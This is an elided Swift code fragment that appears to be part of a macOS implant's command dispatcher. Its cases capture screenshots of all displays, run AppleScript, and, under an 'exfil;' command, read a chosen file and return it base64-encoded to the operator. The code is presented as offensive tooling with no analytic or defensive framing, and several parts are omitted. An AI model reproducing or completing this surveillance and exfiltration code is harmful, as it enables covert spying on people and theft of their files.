                    ...
                    if (displayList == CGError.success) {
                        ...
                        if (displayList == CGError.success) {
                            for singleDisplay in 1...displayCount {
                                ...
                                return returnDataRaw(inCommand: String(progCallSplit), returnType: "Image", fileName: String(screenshotTime) + ".jpg", returnData: screenshotData.base64EncodedString()).returnDict as NSDictionary
                            }
                        }
                    }
                case ("osascript;"):
                ...
                case ("exfil;"):
                    if fileManager.fileExists(atPath: directoryPath(command: command)) == true {
                        do {
                            ...
                            return returnDataRaw(inCommand: String(progCallSplit), returnType: "Data", fileName: filePath(command: command), returnData: data.base64EncodedString()).returnDict as NSDictionary
                        }
                        catch {
                            return returnData(inCommand: String(progCallSplit), returnType: "Error", returnData: error).returnDict as NSDictionary
                        }
